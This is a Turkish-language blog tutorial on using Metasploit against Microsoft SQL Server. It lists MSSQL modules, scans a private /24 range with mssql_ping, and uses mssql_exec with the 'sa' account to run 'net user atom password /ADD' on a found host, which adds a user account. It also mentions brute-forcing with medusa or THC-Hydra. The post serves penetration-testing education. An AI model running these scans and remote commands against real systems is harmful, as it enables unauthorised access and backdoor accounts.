---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-16T12:52:00Z"
excerpt: Metasploit Framework’ün kullanıcıya sağladığı imkanlardan bir tanesi de dahil
  bulunduğunuz ağdaki diğer Ip adreslerinde MSSQL kurulumunun olup olmadığını araştırabilmenizdir.
  Bunun için UDP tarama ile iz araması yapılır.
guid: https://www.siberoloji.com/?p=1153
id: 1153
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF İçinde MSSQL Tarama
url: /tr/msf-icinde-mssql-tarama/
---

  Metasploit Framework’ün kullanıcıya sağladığı imkanlardan bir tanesi de dahil bulunduğunuz ağdaki diğer Ip adreslerinde MSSQL kurulumunun olup olmadığını araştırabilmenizdir. Bunun için UDP tarama ile iz araması yapılır. 
 

  MSSQL ilk kurulduğunda varsayılan olara 1433 numaralı porttan dinleme yapar. Dinlemenin, 1433 portundan değil de rastgele seçilen portlardan yapılması ayarlanmış olabilir. Bu durumda da 1434 numaralı porta, dinlemenin hangi porttan yapıldığı sorulabilir. 
 

  Aşağıdaki örnekte, öncelikle içinde&nbsp;<code>mssql</code>&nbsp;ifadesi geçen modüller aranmaktadır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> search mssql

Matching Modules
<strong>================</strong>

   Name                                                      Disclosure Date  Rank       Description
   ----                                                      ---------------  ----       -----------
   auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
   auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
   auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
   auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
   auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
   auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
   auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
   auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker <strong>(</strong>Fast Mode<strong>)</strong>
   auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
   auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
   auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
   auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
   auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump
   auxiliary/server/capture/mssql                                             normal     Authentication Capture: MSSQL
   exploit/windows/iis/msadc                                 1998-07-17       excellent  MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   exploit/windows/mssql/lyris_listmanager_weak_pass         2005-12-08       excellent  Lyris ListManager MSDE Weak sa Password
   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       MS02-039 Microsoft SQL Server Resolution Overflow
   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       MS02-056 Microsoft SQL Server Hello Overflow
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Microsoft SQL Server Clr Stored Procedure Payload Execution
   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      Microsoft SQL Server Database Link Crawling Command Execution
   exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Microsoft SQL Server Payload Execution
   exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  Microsoft SQL Server Payload Execution via SQL Injection
   post/windows/gather/credentials/mssql_local_hashdump                       normal     Windows Gather Local SQL Server Hash Dump
   post/windows/manage/mssql_local_auth_bypass                                normal     Windows Manage Local Microsoft SQL Server Authorization Bypass
</code></pre>
<!-- /wp:code -->

  Listelenen modüllerden&nbsp;<code>auxiliary/scanner/mssql/mssql_ping</code>&nbsp;isimli modülü kullanacağız. Aşağıdaki örnekte&nbsp;<code>10.211.55.1/24</code>&nbsp;IP adres aralığına MSSQL taraması yapılmaktadır. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> use auxiliary/scanner/mssql/mssql_ping
msf auxiliary<strong>(</strong>mssql_ping<strong>)</strong> <strong>&gt;</strong> show options

Module options <strong>(</strong>auxiliary/scanner/mssql/mssql_ping<strong>)</strong>:

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password <strong>for </strong>the specified username
   RHOSTS                                yes       The target address range or CIDR identifier
   TDSENCRYPTION        false            yes       Use TLS/SSL <strong>for </strong>TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification <strong>(</strong>requires DOMAIN option set<strong>)</strong>

msf auxiliary<strong>(</strong>mssql_ping<strong>)</strong> <strong>&gt;</strong> set RHOSTS 10.211.55.1/24
RHOSTS <strong>=&gt;</strong> 10.211.55.1/24
msf auxiliary<strong>(</strong>mssql_ping<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> SQL Server information <strong>for </strong>10.211.55.128:
<strong>[</strong><strong>*</strong><strong>]</strong> tcp <strong>=</strong> 1433
<strong>[</strong><strong>*</strong><strong>]</strong> np <strong>=</strong> SSHACKTHISBOX-0pipesqlquery
<strong>[</strong><strong>*</strong><strong>]</strong> Version <strong>=</strong> 8.00.194
<strong>[</strong><strong>*</strong><strong>]</strong> InstanceName <strong>=</strong> MSSQLSERVER
<strong>[</strong><strong>*</strong><strong>]</strong> IsClustered <strong>=</strong> No
<strong>[</strong><strong>*</strong><strong>]</strong> ServerName <strong>=</strong> SSHACKTHISBOX-0
<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
</code></pre>
<!-- /wp:code -->

  Sonuçta görüldüğü gibi&nbsp;<code>10.211.55.128</code>&nbsp;IP adresinde ve 1433 numaralı Portta MSSQL servisi çalışmaktadır. Bu noktadan sonra&nbsp;<code>mssql_exec</code>&nbsp;modülü kullanılarak&nbsp;<strong>brute-force</strong>&nbsp;denemeleri yapılabilir. Alternatif olarak medusa veya THC-Hydra kullanılabilir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary<strong>(</strong>mssql_login<strong>)</strong> <strong>&gt;</strong> use auxiliary/admin/mssql/mssql_exec
msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> show options

Module options <strong>(</strong>auxiliary/admin/mssql/mssql_exec<strong>)</strong>:

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED <strong>&gt;</strong> C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password <strong>for </strong>the specified username
   RHOST                                                      yes       The target address
   RPORT                1433                                  yes       The target port <strong>(</strong>TCP<strong>)</strong>
   TDSENCRYPTION        false                                 yes       Use TLS/SSL <strong>for </strong>TDS data "Force Encryption"
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification <strong>(</strong>requires DOMAIN option set<strong>)</strong>


msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> set RHOST 10.211.55.128
RHOST <strong>=&gt;</strong> 10.211.55.128
msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> set MSSQL_PASS password
MSSQL_PASS <strong>=&gt;</strong> password
msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> set CMD net user atom password /ADD
cmd <strong>=&gt;</strong> net user atom password /ADD
msf auxiliary<strong>(</strong>mssql_exec<strong>)</strong> <strong>&gt;</strong> exploit
</code></pre>
<!-- /wp:code -->

  Yukarıdaki örnekte, exploit başarılı olduğu takdirde,&nbsp;<code>net user atom password /ADD</code>&nbsp;komutunun gönderilerek MSSQL veri tabanına bir kullanıcı eklenmektedir. Bu komutun,&nbsp;<code>set CMD net user atom password /ADD</code>&nbsp;ile CMD değişkenine girildiğine dikkat edin. 
 